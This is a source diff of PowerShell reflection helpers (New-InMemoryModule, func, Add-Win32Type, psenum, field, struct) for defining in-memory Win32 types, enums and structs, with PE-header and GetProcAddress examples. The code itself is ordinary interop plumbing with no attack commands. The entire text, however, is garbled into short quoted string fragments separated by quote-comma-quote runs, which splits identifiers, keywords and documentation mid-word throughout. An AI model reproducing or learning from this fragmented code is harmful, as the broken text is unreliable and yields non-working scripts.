-The ','''struct'' func','tion facilita','tes the creat','ion of struct','s entirely in','
-memory using',' as close to ','a "C style" a','s PowerShell ','will allow. S','truct
-fields ','are specified',' using a hash','table where e','ach field of ','the struct
-is',' comprosed of',' the order in',' which it sho','uld be define','d, its .NET
-t','ype, and opti','onally, its o','ffset and spe','cial marshali','ng attributes','.
-One of the ','features of ''','struct'' is th','at after your',' struct is de','fined,
-it wil','l come with a',' built-in Get','Size method a','s well as an ','explicit
-conv','erter so that',' you can easi','ly cast an In','tPtr to the s','truct without','
-relying upon',' calling Size','Of and/or Ptr','ToStructure i','n the Marshal','
-class.
-.PARA','METER Module
-','The in-memory',' module that ','will host the',' struct. Use
-','New-InMemoryM','odule to defi','ne an in-memo','ry module.
-.P','ARAMETER Full','Name
-The full','y-qualified n','ame of the st','ruct.
-.PARAME','TER StructFie','lds
-A hashtab','le of fields.',' Use the ''fie','ld'' helper fu','nction to eas','e
-defining ea','ch field.
-.PA','RAMETER Packi','ngSize
-Specif','ies the memor','y alignment o','f fields.
-.PA','RAMETER Expli','citLayout
-Ind','icates that a','n explicit of','fset for each',' field will b','e specified.
+.SYNO','PSIS
+Create','s an in-mem','ory assembl','y and modul','e
+Author: M','atthew Grae','ber (@matti','festation)
+','License: BS','D 3-Clause
+','Required De','pendencies:',' None
+Optio','nal Depende','ncies: None','
+.DESCRIPTI','ON
+When def','ining custo','m enums, st','ructs, and ','unmanaged f','unctions, i','t is
+necess','ary to asso','ciate to an',' assembly m','odule. This',' helper fun','ction
+creat','es an in-me','mory module',' that can b','e passed to',' the ''enum''',',
+''struct'',',' and Add-Wi','n32Type fun','ctions.
+.PA','RAMETER Mod','uleName
+Spe','cifies the ','desired nam','e for the i','n-memory as','sembly and ','module. If
+','ModuleName ','is not prov','ided, it wi','ll default ','to a GUID.
 ','.EXAMPLE
-$Mod',' = New-InMemo','ryModule -Mod','uleName Win32','
-$ImageDosSig','nature = psen','um $Mod PE.IM','AGE_DOS_SIGNA','TURE UInt16 @','{
-    DOS_SIG','NATURE =    0','x5A4D
-    OS2','_SIGNATURE = ','   0x454E
-   ',' OS2_SIGNATUR','E_LE = 0x454C','
-    VXD_SIGN','ATURE =    0x','454C
-}
-$Image','DosHeader = s','truct $Mod PE','.IMAGE_DOS_HE','ADER @{
-    e','_magic =    f','ield 0 $Image','DosSignature
-','    e_cblp = ','    field 1 U','Int16
-    e_c','p =       fie','ld 2 UInt16
- ','   e_crlc =  ','   field 3 UI','nt16
-    e_cp','arhdr =  fiel','d 4 UInt16
-  ','  e_minalloc ','= field 5 UIn','t16
-    e_max','alloc = field',' 6 UInt16
-   ',' e_ss =      ',' field 7 UInt','16
-    e_sp =','       field ','8 UInt16
-    ','e_csum =     ','field 9 UInt1','6
-    e_ip = ','      field 1','0 UInt16
-    ','e_cs =       ','field 11 UInt','16
-    e_lfar','lc =   field ','12 UInt16
-   ',' e_ovno =    ',' field 13 UIn','t16
-    e_res',' =      field',' 14 UInt16[] ','-MarshalAs @(','''ByValArray'',',' 4)
-    e_oem','id =    field',' 15 UInt16
-  ','  e_oeminfo =','  field 16 UI','nt16
-    e_re','s2 =     fiel','d 17 UInt16[]',' -MarshalAs @','(''ByValArray''',', 10)
-    e_l','fanew =   fie','ld 18 Int32
-}','
-# Example of',' using an exp','licit layout ','in order to c','reate a union','.
-$TestUnion ','= struct $Mod',' TestUnion @{','
-    field1 =',' field 0 UInt','32 0
-    fiel','d2 = field 1 ','IntPtr 0
-} -E','xplicitLayout','
-.NOTES
-Power','Shell purists',' may disagree',' with the nam','ing of this f','unction but
-a','gain, this wa','s developed i','n such a way ','so as to emul','ate a "C styl','e"
-definition',' as closely a','s possible. S','orry, I''m not',' going to nam','e it
-New-Stru','ct. :P
+$M','odule = New','-InMemoryMo','dule -Modul','eName Win32','
 #>
 
-  ','  [OutputType','([Type])]
-   ',' Param (
-    ','    [Paramete','r(Position = ','1, Mandatory=','$True)]
-     ','   [ValidateS','cript({($_ -i','s [Reflection','.Emit.ModuleB','uilder]) -or ','($_ -is [Refl','ection.Assemb','ly])})]
-     ','   $Module,
-
-','        [Para','meter(Positio','n = 2, Mandat','ory=$True)]
- ','       [Valid','ateNotNullOrE','mpty()]
-     ','   [String]
- ','       $FullN','ame,
-
-       ',' [Parameter(P','osition = 3, ','Mandatory=$Tr','ue)]
-        ','[ValidateNotN','ullOrEmpty()]','
-        [Has','htable]
-     ','   $StructFie','lds,
-
-       ',' [Reflection.','Emit.PackingS','ize]
-        ','$PackingSize ','= [Reflection','.Emit.Packing','Size]::Unspec','ified,
-
-     ','   [Switch]
- ','       $Expli','citLayout
+    [D','iagnostics.','CodeAnalysi','s.SuppressM','essageAttri','bute(''PSUse','ShouldProce','ssForStateC','hangingFunc','tions'', '''')',']
+    [Cmdl','etBinding()',']
+    Param',' (
+        ','[Parameter(','Position = ','0)]
+       ',' [ValidateN','otNullOrEmp','ty()]
+     ','   [String]','
+        $M','oduleName =',' [Guid]::Ne','wGuid().ToS','tring()
    ',' )
 
-    if ($','Module -is [R','eflection.Ass','embly])
-    {','
-        retu','rn ($Module.G','etType($FullN','ame))
-    }
+    $Ap','pDomain = [','Reflection.','Assembly].A','ssembly.Get','Type(''Syste','m.AppDomain',''').GetPrope','rty(''Curren','tDomain'').G','etValue($nu','ll, @())
+  ','  $LoadedAs','semblies = ','$AppDomain.','GetAssembli','es()
 
-','    [Reflecti','on.TypeAttrib','utes] $Struct','Attributes = ','''AnsiClass,
- ','       Class,','
-        Publ','ic,
-        S','ealed,
-      ','  BeforeField','Init''
+    f','oreach ($As','sembly in $','LoadedAssem','blies) {
+  ','      if ($','Assembly.Fu','llName -and',' ($Assembly','.FullName.S','plit('','')[0','] -eq $Modu','leName)) {
+','           ',' return $As','sembly
+    ','    }
+    }','
 
-    if',' ($ExplicitLa','yout)
-    {
- ','       $Struc','tAttributes =',' $StructAttri','butes -bor [R','eflection.Typ','eAttributes]:',':ExplicitLayo','ut
-    }
-    ','else
-    {
-  ','      $Struct','Attributes = ','$StructAttrib','utes -bor [Re','flection.Type','Attributes]::','SequentialLay','out
-    }
+    $DynA','ssembly = N','ew-Object R','eflection.A','ssemblyName','($ModuleNam','e)
+    $Dom','ain = $AppD','omain
+    $','AssemblyBui','lder = $Dom','ain.DefineD','ynamicAssem','bly($DynAss','embly, ''Run',''')
+    $Mod','uleBuilder ','= $Assembly','Builder.Def','ineDynamicM','odule($Modu','leName, $Fa','lse)
 
-  ','  $StructBuil','der = $Module','.DefineType($','FullName, $St','ructAttribute','s, [ValueType','], $PackingSi','ze)
-    $Cons','tructorInfo =',' [Runtime.Int','eropServices.','MarshalAsAttr','ibute].GetCon','structors()[0',']
-    $SizeCo','nst = @([Runt','ime.InteropSe','rvices.Marsha','lAsAttribute]','.GetField(''Si','zeConst''))
+    r','eturn $Modu','leBuilder
+}','
 
- ','   $Fields = ','New-Object Ha','shtable[]($St','ructFields.Co','unt)
+# A helpe','r function ','used to red','uce typing ','while defin','ing functio','n
+# prototy','pes for Add','-Win32Type.','
+function f','unc {
+    P','aram (
+    ','    [Parame','ter(Positio','n = 0, Mand','atory = $Tr','ue)]
+      ','  [String]
+','        $Dl','lName,
 
-    # S','ort each fiel','d according t','o the orders ','specified
-   ',' # Unfortunat','ely, PSv2 doe','sn''t have the',' luxury of th','e
-    # hasht','able [Ordered','] accelerator','.
-    foreach',' ($Field in $','StructFields.','Keys)
-    {
- ','       $Index',' = $StructFie','lds[$Field][''','Position'']
-  ','      $Fields','[$Index] = @{','FieldName = $','Field; Proper','ties = $Struc','tFields[$Fiel','d]}
-    }
+   ','     [Param','eter(Positi','on = 1, Man','datory = $T','rue)]
+     ','   [string]','
+        $F','unctionName',',
 
-  ','  foreach ($F','ield in $Fiel','ds)
-    {
-   ','     $FieldNa','me = $Field[''','FieldName'']
- ','       $Field','Prop = $Field','[''Properties''',']
+        ','[Parameter(','Position = ','2, Mandator','y = $True)]','
+        [T','ype]
+      ','  $ReturnTy','pe,
 
-        $O','ffset = $Fiel','dProp[''Offset',''']
-        $T','ype = $FieldP','rop[''Type'']
- ','       $Marsh','alAs = $Field','Prop[''Marshal','As'']
+      ','  [Paramete','r(Position ','= 3)]
+     ','   [Type[]]','
+        $P','arameterTyp','es,
 
-       ',' $NewField = ','$StructBuilde','r.DefineField','($FieldName, ','$Type, ''Publi','c'')
+      ','  [Paramete','r(Position ','= 4)]
+     ','   [Runtime','.InteropSer','vices.Calli','ngConventio','n]
+        ','$NativeCall','ingConventi','on,
 
-        ','if ($MarshalA','s)
-        {
-','            $','UnmanagedType',' = $MarshalAs','[0] -as ([Run','time.InteropS','ervices.Unman','agedType])
-  ','          if ','($MarshalAs[1','])
-          ','  {
-         ','       $Size ','= $MarshalAs[','1]
-          ','      $Attrib','Builder = New','-Object Refle','ction.Emit.Cu','stomAttribute','Builder($Cons','tructorInfo,
-','             ','       $Unman','agedType, $Si','zeConst, @($S','ize))
-       ','     }
-      ','      else
-  ','          {
- ','             ','  $AttribBuil','der = New-Obj','ect Reflectio','n.Emit.Custom','AttributeBuil','der($Construc','torInfo, [Obj','ect[]] @($Unm','anagedType))
-','            }','
-
-           ',' $NewField.Se','tCustomAttrib','ute($AttribBu','ilder)
-      ','  }
-
-        ','if ($Explicit','Layout) { $Ne','wField.SetOff','set($Offset) ','}
-    }
-
-    ','# Make the st','ruct aware of',' its own size','.
-    # No mo','re having to ','call [Runtime','.InteropServi','ces.Marshal]:',':SizeOf!
-    ','$SizeMethod =',' $StructBuild','er.DefineMeth','od(''GetSize'',','
-        ''Pub','lic, Static'',','
-        [Int','],
-        [T','ype[]] @())
- ','   $ILGenerat','or = $SizeMet','hod.GetILGene','rator()
-    #',' Thanks for t','he help, Jaso','n Shirk!
-    ','$ILGenerator.','Emit([Reflect','ion.Emit.OpCo','des]::Ldtoken',', $StructBuil','der)
-    $ILG','enerator.Emit','([Reflection.','Emit.OpCodes]','::Call,
-     ','   [Type].Get','Method(''GetTy','peFromHandle''','))
-    $ILGen','erator.Emit([','Reflection.Em','it.OpCodes]::','Call,
-       ',' [Runtime.Int','eropServices.','Marshal].GetM','ethod(''SizeOf',''', [Type[]] @','([Type])))
-  ','  $ILGenerato','r.Emit([Refle','ction.Emit.Op','Codes]::Ret)
+      ','  [Paramete','r(Position ','= 5)]
+     ','   [Runtime','.InteropSer','vices.CharS','et]
+       ',' $Charset,
 ','
-    # Allow ','for explicit ','casting from ','an IntPtr
-   ',' # No more ha','ving to call ','[Runtime.Inte','ropServices.M','arshal]::PtrT','oStructure!
- ','   $ImplicitC','onverter = $S','tructBuilder.','DefineMethod(','''op_Implicit''',',
-        ''Pr','ivateScope, P','ublic, Static',', HideBySig, ','SpecialName'',','
-        $Str','uctBuilder,
- ','       [Type[',']] @([IntPtr]','))
-    $ILGen','erator2 = $Im','plicitConvert','er.GetILGener','ator()
-    $I','LGenerator2.E','mit([Reflecti','on.Emit.OpCod','es]::Nop)
-   ',' $ILGenerator','2.Emit([Refle','ction.Emit.Op','Codes]::Ldarg','_0)
-    $ILGe','nerator2.Emit','([Reflection.','Emit.OpCodes]','::Ldtoken, $S','tructBuilder)','
-    $ILGener','ator2.Emit([R','eflection.Emi','t.OpCodes]::C','all,
-        ','[Type].GetMet','hod(''GetTypeF','romHandle''))
-','    $ILGenera','tor2.Emit([Re','flection.Emit','.OpCodes]::Ca','ll,
-        [','Runtime.Inter','opServices.Ma','rshal].GetMet','hod(''PtrToStr','ucture'', [Typ','e[]] @([IntPt','r], [Type])))','
-    $ILGener','ator2.Emit([R','eflection.Emi','t.OpCodes]::U','nbox_Any, $St','ructBuilder)
-','    $ILGenera','tor2.Emit([Re','flection.Emit','.OpCodes]::Re','t)
+        [S','tring]
+    ','    $EntryP','oint,
 
-    $Stru','ctBuilder.Cre','ateType()
+    ','    [Switch',']
+        $','SetLastErro','r
+    )
+
+  ','  $Properti','es = @{
+   ','     DllNam','e = $DllNam','e
+        F','unctionName',' = $Functio','nName
+     ','   ReturnTy','pe = $Retur','nType
+    }','
+
+    if ($','ParameterTy','pes) { $Pro','perties[''Pa','rameterType','s''] = $Para','meterTypes ','}
+    if ($','NativeCalli','ngConventio','n) { $Prope','rties[''Nati','veCallingCo','nvention''] ','= $NativeCa','llingConven','tion }
+    ','if ($Charse','t) { $Prope','rties[''Char','set''] = $Ch','arset }
+   ',' if ($SetLa','stError) { ','$Properties','[''SetLastEr','ror''] = $Se','tLastError ','}
+    if ($','EntryPoint)',' { $Propert','ies[''EntryP','oint''] = $E','ntryPoint }','
+
+    New-O','bject PSObj','ect -Proper','ty $Propert','ies
+}
+
+func','tion Add-Wi','n32Type
+{
+<','#
+.SYNOPSIS','
+Creates a ','.NET type f','or an unman','aged Win32 ','function.
+A','uthor: Matt','hew Graeber',' (@mattifes','tation)
+Lic','ense: BSD 3','-Clause
+Req','uired Depen','dencies: No','ne
+Optional',' Dependenci','es: func
+.D','ESCRIPTION
+','Add-Win32Ty','pe enables ','you to easi','ly interact',' with unman','aged (i.e.
+','Win32 unman','aged) funct','ions in Pow','erShell. Af','ter providi','ng
+Add-Win3','2Type with ','a function ','signature, ','a .NET type',' is created','
+using refl','ection (i.e','. csc.exe i','s never cal','led like wi','th Add-Type',').
+The ''fun','c'' helper f','unction can',' be used to',' reduce typ','ing when de','fining
+mult','iple functi','on definiti','ons.
+.PARAM','ETER DllNam','e
+The name ','of the DLL.','
+.PARAMETER',' FunctionNa','me
+The name',' of the tar','get functio','n.
+.PARAMET','ER EntryPoi','nt
+The DLL ','export func','tion name. ','This argume','nt should b','e specified',' if the
+spe','cified func','tion name i','s different',' than the n','ame of the ','exported
+fu','nction.
+.PA','RAMETER Ret','urnType
+The',' return typ','e of the fu','nction.
+.PA','RAMETER Par','ameterTypes','
+The functi','on paramete','rs.
+.PARAME','TER NativeC','allingConve','ntion
+Speci','fies the na','tive callin','g conventio','n of the fu','nction. Def','aults to
+st','dcall.
+.PAR','AMETER Char','set
+If you ','need to exp','licitly cal','l an ''A'' or',' ''W'' Win32 ','function, y','ou can
+spec','ify the cha','racter set.','
+.PARAMETER',' SetLastErr','or
+Indicate','s whether t','he callee c','alls the Se','tLastError ','Win32 API
+f','unction bef','ore returni','ng from the',' attributed',' method.
+.P','ARAMETER Mo','dule
+The in','-memory mod','ule that wi','ll host the',' functions.',' Use
+New-In','MemoryModul','e to define',' an in-memo','ry module.
+','.PARAMETER ','Namespace
+A','n optional ','namespace t','o prepend t','o the type.',' Add-Win32T','ype default','s
+to a name','space consi','sting only ','of the name',' of the DLL','.
+.EXAMPLE
+','$Mod = New-','InMemoryMod','ule -Module','Name Win32
+','$FunctionDe','finitions =',' @(
+  (func',' kernel32 G','etProcAddre','ss ([IntPtr',']) @([IntPt','r], [String',']) -Charset',' Ansi -SetL','astError),
+','  (func ker','nel32 GetMo','duleHandle ','([Intptr]) ','@([String])',' -SetLastEr','ror),
+  (fu','nc ntdll Rt','lGetCurrent','Peb ([IntPt','r]) @())
+)
+','$Types = $F','unctionDefi','nitions | A','dd-Win32Typ','e -Module $','Mod -Namesp','ace ''Win32''','
+$Kernel32 ','= $Types[''k','ernel32'']
+$','Ntdll = $Ty','pes[''ntdll''',']
+$Ntdll::R','tlGetCurren','tPeb()
+$ntd','llbase = $K','ernel32::Ge','tModuleHand','le(''ntdll'')','
+$Kernel32:',':GetProcAdd','ress($ntdll','base, ''RtlG','etCurrentPe','b'')
+.NOTES
+','Inspired by',' Lee Holmes',''' Invoke-Wi','ndowsApi ht','tp://poshco','de.org/2189','
+When defin','ing multipl','e function ','prototypes,',' it is idea','l to provid','e
+Add-Win32','Type with a','n array of ','function si','gnatures. T','hat way, th','ey
+are all ','incorporate','d into the ','same in-mem','ory module.','
+#>
+
+    [O','utputType([','Hashtable])',']
+    Param','(
+        [','Parameter(M','andatory=$T','rue, ValueF','romPipeline','ByPropertyN','ame=$True)]','
+        [S','tring]
+    ','    $DllNam','e,
+
+       ',' [Parameter','(Mandatory=','$True, Valu','eFromPipeli','neByPropert','yName=$True',')]
+        ','[String]
+  ','      $Func','tionName,
+
+','        [Pa','rameter(Val','ueFromPipel','ineByProper','tyName=$Tru','e)]
+       ',' [String]
+ ','       $Ent','ryPoint,
+
+ ','       [Par','ameter(Mand','atory=$True',', ValueFrom','PipelineByP','ropertyName','=$True)]
+  ','      [Type',']
+        $','ReturnType,','
+
+        [','Parameter(V','alueFromPip','elineByProp','ertyName=$T','rue)]
+     ','   [Type[]]','
+        $P','arameterTyp','es,
+
+      ','  [Paramete','r(ValueFrom','PipelineByP','ropertyName','=$True)]
+  ','      [Runt','ime.Interop','Services.Ca','llingConven','tion]
+     ','   $NativeC','allingConve','ntion = [Ru','ntime.Inter','opServices.','CallingConv','ention]::St','dCall,
+
+   ','     [Param','eter(ValueF','romPipeline','ByPropertyN','ame=$True)]','
+        [R','untime.Inte','ropServices','.CharSet]
+ ','       $Cha','rset = [Run','time.Intero','pServices.C','harSet]::Au','to,
+
+      ','  [Paramete','r(ValueFrom','PipelineByP','ropertyName','=$True)]
+  ','      [Swit','ch]
+       ',' $SetLastEr','ror,
+
+     ','   [Paramet','er(Mandator','y=$True)]
+ ','       [Val','idateScript','({($_ -is [','Reflection.','Emit.Module','Builder]) -','or ($_ -is ','[Reflection','.Assembly])','})]
+       ',' $Module,
+
+','        [Va','lidateNotNu','ll()]
+     ','   [String]','
+        $N','amespace = ','''''
+    )
+
+ ','   BEGIN
+  ','  {
+       ',' $TypeHash ','= @{}
+    }','
+
+    PROCE','SS
+    {
+  ','      if ($','Module -is ','[Reflection','.Assembly])','
+        {
+','           ',' if ($Names','pace)
+     ','       {
+  ','           ','   $TypeHas','h[$DllName]',' = $Module.','GetType("$N','amespace.$D','llName")
+  ','          }','
+          ','  else
+    ','        {
+ ','           ','    $TypeHa','sh[$DllName','] = $Module','.GetType($D','llName)
+   ','         }
+','        }
+ ','       else','
+        {
+','           ',' # Define o','ne type for',' each DLL
+ ','           ','if (!$TypeH','ash.Contain','sKey($DllNa','me))
+      ','      {
+   ','           ','  if ($Name','space)
+    ','           ',' {
+        ','           ',' $TypeHash[','$DllName] =',' $Module.De','fineType("$','Namespace.$','DllName", ''','Public,Befo','reFieldInit',''')
+        ','        }
+ ','           ','    else
+  ','           ','   {
+      ','           ','   $TypeHas','h[$DllName]',' = $Module.','DefineType(','$DllName, ''','Public,Befo','reFieldInit',''')
+        ','        }
+ ','           ','}
+
+        ','    $Method',' = $TypeHas','h[$DllName]','.DefineMeth','od(
+       ','         $F','unctionName',',
+         ','       ''Pub','lic,Static,','PinvokeImpl',''',
+        ','        $Re','turnType,
+ ','           ','    $Parame','terTypes)
+
+','           ',' # Make eac','h ByRef par','ameter an O','ut paramete','r
+         ','   $i = 1
+ ','           ','foreach($Pa','rameter in ','$ParameterT','ypes)
+     ','       {
+  ','           ','   if ($Par','ameter.IsBy','Ref)
+      ','          {','
+          ','          [','void] $Meth','od.DefinePa','rameter($i,',' ''Out'', $nu','ll)
+       ','         }
+','
+          ','      $i++
+','           ',' }
+
+       ','     $DllIm','port = [Run','time.Intero','pServices.D','llImportAtt','ribute]
+   ','         $S','etLastError','Field = $Dl','lImport.Get','Field(''SetL','astError'')
+','           ',' $CallingCo','nventionFie','ld = $DllIm','port.GetFie','ld(''Calling','Convention''',')
+         ','   $Charset','Field = $Dl','lImport.Get','Field(''Char','Set'')
+     ','       $Ent','ryPointFiel','d = $DllImp','ort.GetFiel','d(''EntryPoi','nt'')
+      ','      if ($','SetLastErro','r) { $SLEVa','lue = $True',' } else { $','SLEValue = ','$False }
+
+ ','           ','if ($PSBoun','dParameters','[''EntryPoin','t'']) { $Exp','ortedFuncNa','me = $Entry','Point } els','e { $Export','edFuncName ','= $Function','Name }
+
+   ','         # ','Equivalent ','to C# versi','on of [DllI','mport(DllNa','me)]
+      ','      $Cons','tructor = [','Runtime.Int','eropService','s.DllImport','Attribute].','GetConstruc','tor([String','])
+        ','    $DllImp','ortAttribut','e = New-Obj','ect Reflect','ion.Emit.Cu','stomAttribu','teBuilder($','Constructor',',
+         ','       $Dll','Name, [Refl','ection.Prop','ertyInfo[]]',' @(), [Obje','ct[]] @(),
+','           ','     [Refle','ction.Field','Info[]] @($','SetLastErro','rField,
+   ','           ','           ','           ','       $Cal','lingConvent','ionField,
+ ','           ','           ','           ','         $C','harsetField',',
+         ','           ','           ','           ',' $EntryPoin','tField),
+  ','           ','   [Object[',']] @($SLEVa','lue,
+      ','           ','           ',' ([Runtime.','InteropServ','ices.Callin','gConvention','] $NativeCa','llingConven','tion),
+    ','           ','           ','   ([Runtim','e.InteropSe','rvices.Char','Set] $Chars','et),
+      ','           ','           ',' $ExportedF','uncName))
+
+','           ',' $Method.Se','tCustomAttr','ibute($DllI','mportAttrib','ute)
+      ','  }
+    }
+
+','    END
+   ',' {
+        ','if ($Module',' -is [Refle','ction.Assem','bly])
+     ','   {
+      ','      retur','n $TypeHash','
+        }
+','
+        $R','eturnTypes ','= @{}
+
+    ','    foreach',' ($Key in $','TypeHash.Ke','ys)
+       ',' {
+        ','    $Type =',' $TypeHash[','$Key].Creat','eType()
+
+  ','          $','ReturnTypes','[$Key] = $T','ype
+       ',' }
+
+       ',' return $Re','turnTypes
+ ','   }
+}
+
+
+fu','nction psen','um {
+<#
+.SY','NOPSIS
+Crea','tes an in-m','emory enume','ration for ','use in your',' PowerShell',' session.
+A','uthor: Matt','hew Graeber',' (@mattifes','tation)
+Lic','ense: BSD 3','-Clause
+Req','uired Depen','dencies: No','ne
+Optional',' Dependenci','es: None
+.D','ESCRIPTION
+','The ''psenum',''' function ','facilitates',' the creati','on of enums',' entirely i','n
+memory us','ing as clos','e to a "C s','tyle" as Po','werShell wi','ll allow.
+.','PARAMETER M','odule
+The i','n-memory mo','dule that w','ill host th','e enum. Use','
+New-InMemo','ryModule to',' define an ','in-memory m','odule.
+.PAR','AMETER Full','Name
+The fu','lly-qualifi','ed name of ','the enum.
+.','PARAMETER T','ype
+The typ','e of each e','num element','.
+.PARAMETE','R EnumEleme','nts
+A hasht','able of enu','m elements.','
+.PARAMETER',' Bitfield
+S','pecifies th','at the enum',' should be ','treated as ','a bitfield.','
+.EXAMPLE
+$','Mod = New-I','nMemoryModu','le -ModuleN','ame Win32
+$','ImageSubsys','tem = psenu','m $Mod PE.I','MAGE_SUBSYS','TEM UInt16 ','@{
+    UNKN','OWN =      ','           ',' 0
+    NATI','VE =       ','           ',' 1 # Image ','doesn''t req','uire a subs','ystem.
+    ','WINDOWS_GUI',' =         ','     2 # Im','age runs in',' the Window','s GUI subsy','stem.
+    W','INDOWS_CUI ','=          ','    3 # Ima','ge runs in ','the Windows',' character ','subsystem.
+','    OS2_CUI',' =         ','         5 ','# Image run','s in the OS','/2 characte','r subsystem','.
+    POSIX','_CUI =     ','           ','7 # Image r','uns in the ','Posix chara','cter subsys','tem.
+    NA','TIVE_WINDOW','S =        ','   8 # Imag','e is a nati','ve Win9x dr','iver.
+    W','INDOWS_CE_G','UI =       ','    9 # Ima','ge runs in ','the Windows',' CE subsyst','em.
+    EFI','_APPLICATIO','N =        ','  10
+    EF','I_BOOT_SERV','ICE_DRIVER ','=  11
+    E','FI_RUNTIME_','DRIVER =   ','    12
+    ','EFI_ROM =  ','           ','     13
+   ',' XBOX =    ','           ','      14
+  ','  WINDOWS_B','OOT_APPLICA','TION = 16
+}','
+.NOTES
+Pow','erShell pur','ists may di','sagree with',' the naming',' of this fu','nction but
+','again, this',' was develo','ped in such',' a way so a','s to emulat','e a "C styl','e"
+definiti','on as close','ly as possi','ble. Sorry,',' I''m not go','ing to name',' it
+New-Enu','m. :P
+#>
+
+ ','   [OutputT','ype([Type])',']
+    Param',' (
+        ','[Parameter(','Position = ','0, Mandator','y=$True)]
+ ','       [Val','idateScript','({($_ -is [','Reflection.','Emit.Module','Builder]) -','or ($_ -is ','[Reflection','.Assembly])','})]
+       ',' $Module,
+
+','        [Pa','rameter(Pos','ition = 1, ','Mandatory=$','True)]
+    ','    [Valida','teNotNullOr','Empty()]
+  ','      [Stri','ng]
+       ',' $FullName,','
+
+        [','Parameter(P','osition = 2',', Mandatory','=$True)]
+  ','      [Type',']
+        $','Type,
+
+    ','    [Parame','ter(Positio','n = 3, Mand','atory=$True',')]
+        ','[ValidateNo','tNullOrEmpt','y()]
+      ','  [Hashtabl','e]
+        ','$EnumElemen','ts,
+
+      ','  [Switch]
+','        $Bi','tfield
+    ',')
+
+    if (','$Module -is',' [Reflectio','n.Assembly]',')
+    {
+   ','     return',' ($Module.G','etType($Ful','lName))
+   ',' }
+
+    $En','umType = $T','ype -as [Ty','pe]
+
+    $E','numBuilder ','= $Module.D','efineEnum($','FullName, ''','Public'', $E','numType)
+
+ ','   if ($Bit','field)
+    ','{
+        $','FlagsConstr','uctor = [Fl','agsAttribut','e].GetConst','ructor(@())','
+        $F','lagsCustomA','ttribute = ','New-Object ','Reflection.','Emit.Custom','AttributeBu','ilder($Flag','sConstructo','r, @())
+   ','     $EnumB','uilder.SetC','ustomAttrib','ute($FlagsC','ustomAttrib','ute)
+    }
+','
+    foreac','h ($Key in ','$EnumElemen','ts.Keys)
+  ','  {
+       ',' # Apply th','e specified',' enum type ','to each ele','ment
+      ','  $null = $','EnumBuilder','.DefineLite','ral($Key, $','EnumElement','s[$Key] -as',' $EnumType)','
+    }
+
+   ',' $EnumBuild','er.CreateTy','pe()
+}
+
+
+# ','A helper fu','nction used',' to reduce ','typing whil','e defining ','struct
+# fi','elds.
+funct','ion field {','
+    Param ','(
+        [','Parameter(P','osition = 0',', Mandatory','=$True)]
+  ','      [UInt','16]
+       ',' $Position,','
+
+        [','Parameter(P','osition = 1',', Mandatory','=$True)]
+  ','      [Type',']
+        $','Type,
+
+    ','    [Parame','ter(Positio','n = 2)]
+   ','     [UInt1','6]
+        ','$Offset,
+
+ ','       [Obj','ect[]]
+    ','    $Marsha','lAs
+    )
+
+','    @{
+    ','    Positio','n = $Positi','on
+        ','Type = $Typ','e -as [Type',']
+        O','ffset = $Of','fset
+      ','  MarshalAs',' = $Marshal','As
+    }
+}
+','
+
+function ','struct
+{
+<#','
+.SYNOPSIS
+','Creates an ','in-memory s','truct for u','se in your ','PowerShell ','session.
+Au','thor: Matth','ew Graeber ','(@mattifest','ation)
+Lice','nse: BSD 3-','Clause
+Requ','ired Depend','encies: Non','e
+Optional ','Dependencie','s: field
+.D','ESCRIPTION
+','The ''struct',''' function ','facilitates',' the creati','on of struc','ts entirely',' in
+memory ','using as cl','ose to a "C',' style" as ','PowerShell ','will allow.',' Struct
+fie','lds are spe','cified usin','g a hashtab','le where ea','ch field of',' the struct','
+is compros','ed of the o','rder in whi','ch it shoul','d be define','d, its .NET','
+type, and ','optionally,',' its offset',' and specia','l marshalin','g attribute','s.
+One of t','he features',' of ''struct',''' is that a','fter your s','truct is de','fined,
+it w','ill come wi','th a built-','in GetSize ','method as w','ell as an e','xplicit
+con','verter so t','hat you can',' easily cas','t an IntPtr',' to the str','uct without','
+relying up','on calling ','SizeOf and/','or PtrToStr','ucture in t','he Marshal
+','class.
+.PAR','AMETER Modu','le
+The in-m','emory modul','e that will',' host the s','truct. Use
+','New-InMemor','yModule to ','define an i','n-memory mo','dule.
+.PARA','METER FullN','ame
+The ful','ly-qualifie','d name of t','he struct.
+','.PARAMETER ','StructField','s
+A hashtab','le of field','s. Use the ','''field'' hel','per functio','n to ease
+d','efining eac','h field.
+.P','ARAMETER Pa','ckingSize
+S','pecifies th','e memory al','ignment of ','fields.
+.PA','RAMETER Exp','licitLayout','
+Indicates ','that an exp','licit offse','t for each ','field will ','be specifie','d.
+.EXAMPLE','
+$Mod = New','-InMemoryMo','dule -Modul','eName Win32','
+$ImageDosS','ignature = ','psenum $Mod',' PE.IMAGE_D','OS_SIGNATUR','E UInt16 @{','
+    DOS_SI','GNATURE =  ','  0x5A4D
+  ','  OS2_SIGNA','TURE =    0','x454E
+    O','S2_SIGNATUR','E_LE = 0x45','4C
+    VXD_','SIGNATURE =','    0x454C
+','}
+$ImageDos','Header = st','ruct $Mod P','E.IMAGE_DOS','_HEADER @{
+','    e_magic',' =    field',' 0 $ImageDo','sSignature
+','    e_cblp ','=     field',' 1 UInt16
+ ','   e_cp =  ','     field ','2 UInt16
+  ','  e_crlc = ','    field 3',' UInt16
+   ',' e_cparhdr ','=  field 4 ','UInt16
+    ','e_minalloc ','= field 5 U','Int16
+    e','_maxalloc =',' field 6 UI','nt16
+    e_','ss =       ','field 7 UIn','t16
+    e_s','p =       f','ield 8 UInt','16
+    e_cs','um =     fi','eld 9 UInt1','6
+    e_ip ','=       fie','ld 10 UInt1','6
+    e_cs ','=       fie','ld 11 UInt1','6
+    e_lfa','rlc =   fie','ld 12 UInt1','6
+    e_ovn','o =     fie','ld 13 UInt1','6
+    e_res',' =      fie','ld 14 UInt1','6[] -Marsha','lAs @(''ByVa','lArray'', 4)','
+    e_oemi','d =    fiel','d 15 UInt16','
+    e_oemi','nfo =  fiel','d 16 UInt16','
+    e_res2',' =     fiel','d 17 UInt16','[] -Marshal','As @(''ByVal','Array'', 10)','
+    e_lfan','ew =   fiel','d 18 Int32
+','}
+# Example',' of using a','n explicit ','layout in o','rder to cre','ate a union','.
+$TestUnio','n = struct ','$Mod TestUn','ion @{
+    ','field1 = fi','eld 0 UInt3','2 0
+    fie','ld2 = field',' 1 IntPtr 0','
+} -Explici','tLayout
+.NO','TES
+PowerSh','ell purists',' may disagr','ee with the',' naming of ','this functi','on but
+agai','n, this was',' developed ','in such a w','ay so as to',' emulate a ','"C style"
+d','efinition a','s closely a','s possible.',' Sorry, I''m',' not going ','to name it
+','New-Struct.',' :P
+#>
+
+   ',' [OutputTyp','e([Type])]
